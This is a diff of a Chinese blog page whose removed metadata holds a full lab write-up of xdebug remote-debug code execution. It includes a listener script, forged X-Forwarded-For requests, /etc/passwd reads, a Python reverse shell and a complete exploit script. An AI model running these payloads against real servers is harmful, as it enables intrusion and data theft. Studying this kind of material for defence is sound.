@@ -1,630 +1,503 @@
-
 <!DOCTYPE html>
 <html lang="zh-cn">
-    
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hexo">
-    <title>xdebug - Hexo</title>
-    <meta name="author" content="John Doe">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
     
-    
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同，\n几个常见配置\n123456789101112设置调试工具，xdebug.idekey=&quot;PHPSTORM&quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=9000开启回连xdebug.remote_connect_back = 1开启xdebugxdebug.remote_enable = 1\n\n回连地址xdebug的回连地址是通过自定义header，来判断回连到哪一个ip地址，\n一般由三个属性决定\n12345xdebug.remote_addr_headerX-Forwarded-For Remote-Addr\n\nxff是可以在请求头中伪造的，所以就算配置了其他的两个，也没有关系，照样可以连接到我指定的ip地址上\n固定ip模式默认情况下，\n1xdebug.remote_connect_back = 0\n\n也叫固定ip模式\n这种情况下，后台会去访问\nxdebug.remote_host=localhost\nxdebug.remote_port=9000\n这一对ip 和端口，默认是localhost:9000 这样只适合单一客户端请求\n非固定ip模式1xdebug.remote_connect_back = 1\n\n这时后台会去访问回连地址。依次访问\n这时候问题就出现了，如果在请求头中加入一个xff字段，那么就可以让服务器回连到指定的ip地址上\n利用条件1234567xdebug.remote_connect_back = 1   //开启回连 并且此选项开启时，xdebug会忽略xdebug.remote_host直接把客户端ip当作回连ip，也就是谁访问它，谁就是回连ipxdebug.remote_enable = 1         //开启xdebugxdebug.remote_log =  /tmp/test.log\n\nDBGp协议source1source -i transaction_id -f fileURI\n\ntransaction_id 貌似没有那么硬性的要求，每次都为 1 即可，fileURI 是要读取的文件的路径，需要注意的是，Xdebug 也受限于 open_basedir。\n利用方式\n1source -i 1 -f file:///etc/passwd\n\n还可以利用php://filter  ssrf等\n脚本里面要这样写\n1conn.sendall(&apos;source -i 1 -f %s\\x00&apos; % data)\n\neval12345eval -i transaction_id -- &#123;DATA&#125;&#123;DATA&#125; 为 base64 过的 PHP 代码。 利用方式（c3lzdGVtKCJpZCIpOw== == system(&quot;id&quot;);）：eval -i 1 -- c3lzdGVtKCJpZCIpOw==\n\n脚本里面要这样写\n1conn.sendall(&apos;eval -i 1 -- %s\\x00&apos; % data.encode(&apos;base64&apos;))\n\nproperty_set代码执行 和eval一样，要是eval被禁了，可以用这个\n123/* Do the eval */eval_string = xdebug_sprintf(&quot;%s = %s&quot;, CMD_OPTION(&apos;n&apos;), new_value);res = xdebug_do_eval(eval_string, &amp;ret_zval TSRMLS_CC);\n\n利用方式\n12property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw== property_get -n $a -i 1 -c 1 -p 0\n\n脚本里面要这样写\n1conn.sendall(&apos;property_set -n $a -i 1 -c 1 -- %s\\x00&apos; % data.encode(&apos;base64&apos;))\n\n利用过程请求头\n12345678910GET /index.php?XDEBUG_SESSION_START=phpstrom HTTP/1.1Host: 192.168.110.140:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Forwarded-For:192.168.110.1Connection: closeUpgrade-Insecure-Requests: 1\n\n本地监听9000端口\n123456nc -lvp 9000listening on [any] 9000 ...192.168.110.140: inverse host lookup failed: h_errno 11004: NO_DATAconnect to [192.168.110.1] from (UNKNOWN) [192.168.110.140] 53884: NO_DATA486 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;init xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" fileuri=\"file:///var/www/html/index.php\" language=\"PHP\" xdebug:language_version=\"7.1.12\" protocol_version=\"1.0\" appid=\"23\" idekey=\"phpstrom\"&gt;&lt;engine version=\"2.5.5\"&gt;&lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt;&lt;author&gt;&lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt;&lt;url&gt;&lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt;&lt;copyright&gt;&lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt;\n\n可以确定服务端开启了xdebug，并且开启了远程连接\n攻击链先是burp发送请求访问调试界面，这时因为xdebug开启了回连，依次请求\n12345xdebug.remote_addr_headerX-Forwarded-For Remote-Addr\n\n当访问到X-Forwarded-For的时候，就会访问其所指向的ip和端口(端口默认是9000，会自动的去请求9000端口，所以ip上不用加上9000端口)，这时在本地监听9000端口就可以收到xdebug发送的请求\n执行命令创建一个exp2.py\n123456789101112131415#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input('&gt;&gt; ')    conn.sendall('eval -i 1 -- %s\\x00' % data.encode('base64'))\n\n这段代码就是代替nc 监听9000端口(eval可以换成source property_set等)\n主机运行\n1python2 exp2.py\n\nburp发包\n12345678910GET /index.php?XDEBUG_SESSION_START=phpstrom HTTP/1.1Host: 192.168.110.140:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1X-Forwarded-For:192.168.110.1Connection: closeUpgrade-Insecure-Requests: 1\n\n还是刚才那个数据包\n也可以这样,更方便一点\n1curl 'http://192.168.110.140/index.php?XDEBUG_SESSION_START=PHPSTORM' -H \"X-Forwarded-For:你的公网IP地址\"\n\n在回弹的窗口中执行\n123&gt;&gt; system('ls');263 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"eval\" transaction_id=\"1\"&gt;&lt;property type=\"string\" size=\"9\" encoding=\"base64\"&gt;&lt;![CDATA[aW5kZXgucGhw]]&gt;&lt;/property&gt;&lt;/response&gt;\n\n注意这里的ls命令是在linux下的  如果在windows下，需要cmd命令\n这一段\n1[CDATA[aW5kZXgucGhw]]&gt;\n\nbase64解码 就可以拿到文件名 ==&gt;index.php\nfile协议读文件123&gt;&gt; system('curl file:///etc/passwd')348 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"eval\" transaction_id=\"1\"&gt;&lt;property type=\"string\" size=\"72\" encoding=\"base64\"&gt;&lt;![CDATA[c3lzdGVtZC1idXMtcHJveHk6eDoxMDM6MTA2OnN5c3RlbWQgQnVzIFByb3h5LCwsOi9ydW4vc3lzdGVtZDovYmluL2ZhbHNl]]&gt;&lt;/property&gt;&lt;/response&gt;\n\n这里好像有字符数量限制\n利用source读文件12只需要把eval改成这样conn.sendall('source -i 1 -f file:///%s\\x00' % data)\n\n这里还是有点问题，不能一次读完 貌似得用绝对路径  \n用index.php的时候，报错没找到文件   ./index.php也不行\n123&gt;&gt; ./index.php283 &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;response xmlns=&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug=&quot;http://xdebug.org/dbgp/xdebug&quot; command=&quot;source&quot; transaction_id=&quot;1&quot; status=&quot;starting&quot; reason=&quot;ok&quot;&gt;&lt;error code=&quot;100&quot;&gt;&lt;message&gt;&lt;![CDATA[can not open file]]&gt;&lt;/message&gt;&lt;/error&gt;&lt;/response&gt;\n\n连续两次命令，会把第一次没有发送完的文件，在发送过来（难道是nc接受的问题？？？ 或者是服务端限制了文件的大小，当第二次读文件的时候，会从上一次结束的地方，继续往下读）\n12345&gt;&gt; /etc/passwd1805 &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"source\" transaction_id=\"1\" encoding=\"base64\"&gt;&lt;![CDATA[cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9u&gt;&gt; /etc/passwdb2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAzOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwNDpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA1OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDY6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UK\n\n反弹shell用python反弹一下\n123456import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"192.168.110.1\",9999));os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"])\n\n写木马利用base64\n12\n\n访问shell.php 可以执行phpinfo()\n这里附上 exp p神的一键脚本\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool = ThreadPoolExecutor(1)session = requests.session()session.headers = &#123;    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'&#125;def recv_xml(sock):    blocks = []    data = b''    while True:        try:            data = data + sock.recv(1024)        except socket.error as e:            break        if not data:            break        while data:            eop = data.find(b'\\x00')            if eop &lt; 0:                break            blocks.append(data[:eop])            data = data[eop+1:]        if len(blocks) &gt;= 4:            break        return blocks[3]def trigger(url):    time.sleep(2)    try:        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)    except:        passif __name__ == '__main__':    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')    parser.add_argument('-t', '--target', required=True, help='target url.')    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')    args = parser.parse_args()        ip_port = ('0.0.0.0', args.listen)    sk = socket.socket()    sk.settimeout(10)    sk.bind(ip_port)    sk.listen(5)    pool.submit(trigger, args.target)    conn, addr = sk.accept()    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\\x00']))    data = recv_xml(conn)    print('[+] Recieve data: ' + data.decode())    g = re.search(rb'&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;', data, re.I)    if not g:        print('[-] No result...')        sys.exit(0)    data = g.group(1)    try:        print('[+] Result: ' + base64.b64decode(data).decode())    except binascii.Error:        print('[-] May be not string result...')\n\n结果\n1234E:\\tools\\netcat&gt;python3 exp.py -t http://192.168.110.140:8080/index.php -c \"shell_exec('id');\"[+] Recieve data: &lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;&lt;response xmlns=\"urn:debugger_protocol_v1\" xmlns:xdebug=\"http://xdebug.org/dbgp/xdebug\" command=\"eval\" transaction_id=\"1\"&gt;&lt;property type=\"string\" size=\"54\" encoding=\"base64\"&gt;&lt;![CDATA[dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK]]&gt;&lt;/property&gt;&lt;/response&gt;[+] Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n参考链接\nhttps://blog.spoock.com/2017/09/19/xdebug-attack-surface/\nhttps://paper.seebug.org/397/\nhttps://www.restran.net/2017/09/16/php-xdebug-cmd-exec/\nhttps://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py\n","dateCreated":"2019-09-24T15:19:05+08:00","dateModified":"2019-10-09T14:04:00+08:00","datePublished":"2019-09-24T15:19:05+08:00","description":"","headline":"xdebug","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/24/xdebug/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/24/xdebug/"}</script>
-    <meta name="description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="xdebug">
-<meta property="og:url" content="http://p1keman.github.io/2019/09/24/xdebug/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-10-09T06:04:00.442Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xdebug">
-<meta name="twitter:description" content="基础知识工作原理xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同， 几个常见配置 123456789101112设置调试工具，xdebug.idekey=&amp;quot;PHPSTORM&amp;quot;绑定远程调试主机地址xdebug.remote_host=localhost远程主机监听的端口xdebug.remote_port=">
-    
-    
+    <title>
         
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
-    <!--STYLES END-->
-    
-
-    
-
-    
+            xdebug |
         
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-</head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
+<link rel="stylesheet" href="/css/style.css">
 
     
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/ "
-            aria-label=""
-        >
-            Hexo
-        </a>
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-        
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="打开链接: /#about"
-            >
-        
-        
-        </a>
-    
-</header>
 
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
-        
-        
-            <ul class="sidebar-buttons">
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="首页"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">首页</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="分类"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">分类</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="标签"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">标签</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="归档"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">归档</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="搜索"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">搜索</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="关于"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
             
         </ul>
-        
     </div>
-</nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
                 
-<article class="post">
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">xdebug</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2019-09-24 15:19:05
+    </span>
     
     
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            xdebug
-        </h1>
+
     
     
-        <div class="post-meta">
-    <time datetime="2019-09-24T15:19:05+08:00">
-	
-		    9月 24, 2019
-    	
-    </time>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-    
-</div>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
+        <div class="article-content markdown-body">
             <a id="more"></a>
 
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>xedbug是一个调试php程序的扩展程序，因为php是一个写网站的语言，他的调试和python Java等也有所不同，</p>
 <p>几个常见配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">设置调试工具，</span><br><span class="line">xdebug.idekey=&quot;PHPSTORM&quot;</span><br><span class="line"></span><br><span class="line">绑定远程调试主机地址</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line"></span><br><span class="line">远程主机监听的端口</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">开启回连</span><br><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">开启xdebug</span><br><span class="line">xdebug.remote_enable = 1</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">设置调试工具，</span><br><span class="line">xdebug.idekey&#x3D;&quot;PHPSTORM&quot;</span><br><span class="line"></span><br><span class="line">绑定远程调试主机地址</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line"></span><br><span class="line">远程主机监听的端口</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">开启回连</span><br><span class="line">xdebug.remote_connect_back &#x3D; 1</span><br><span class="line">开启xdebug</span><br><span class="line">xdebug.remote_enable &#x3D; 1 </span><br></pre></td></tr></table></figure>
 <h4 id="回连地址"><a href="#回连地址" class="headerlink" title="回连地址"></a>回连地址</h4><p>xdebug的回连地址是通过自定义header，来判断回连到哪一个ip地址，</p>
 <p>一般由三个属性决定</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_addr_header</span><br><span class="line"></span><br><span class="line">X-Forwarded-For </span><br><span class="line"></span><br><span class="line">Remote-Addr</span><br></pre></td></tr></table></figure>
-
 <p>xff是可以在请求头中伪造的，所以就算配置了其他的两个，也没有关系，照样可以连接到我指定的ip地址上</p>
 <h4 id="固定ip模式"><a href="#固定ip模式" class="headerlink" title="固定ip模式"></a>固定ip模式</h4><p>默认情况下，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = 0</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back &#x3D; 0</span><br></pre></td></tr></table></figure>
 <p>也叫固定ip模式</p>
 <p>这种情况下，后台会去访问</p>
 <p>xdebug.remote_host=localhost</p>
 <p>xdebug.remote_port=9000</p>
 <p>这一对ip 和端口，默认是localhost:9000 这样只适合单一客户端请求</p>
-<h4 id="非固定ip模式"><a href="#非固定ip模式" class="headerlink" title="非固定ip模式"></a>非固定ip模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = 1</span><br></pre></td></tr></table></figure>
-
+<h4 id="非固定ip模式"><a href="#非固定ip模式" class="headerlink" title="非固定ip模式"></a>非固定ip模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back &#x3D; 1</span><br></pre></td></tr></table></figure>
 <p>这时后台会去访问回连地址。依次访问</p>
 <p>这时候问题就出现了，如果在请求头中加入一个xff字段，那么就可以让服务器回连到指定的ip地址上</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">xdebug.remote_connect_back = 1   //开启回连 并且此选项开启时，xdebug会忽略xdebug.remote_host</span><br><span class="line">直接把客户端ip当作回连ip，也就是谁访问它，谁就是回连ip</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable = 1         //开启xdebug</span><br><span class="line"></span><br><span class="line">xdebug.remote_log =  /tmp/test.log</span><br></pre></td></tr></table></figure>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">xdebug.remote_connect_back &#x3D; 1   &#x2F;&#x2F;开启回连 并且此选项开启时，xdebug会忽略xdebug.remote_host</span><br><span class="line">直接把客户端ip当作回连ip，也就是谁访问它，谁就是回连ip</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable &#x3D; 1         &#x2F;&#x2F;开启xdebug</span><br><span class="line"></span><br><span class="line">xdebug.remote_log &#x3D;  &#x2F;tmp&#x2F;test.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 
 <h3 id="DBGp协议"><a href="#DBGp协议" class="headerlink" title="DBGp协议"></a>DBGp协议</h3><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source -i transaction_id -f fileURI</span><br></pre></td></tr></table></figure>
-
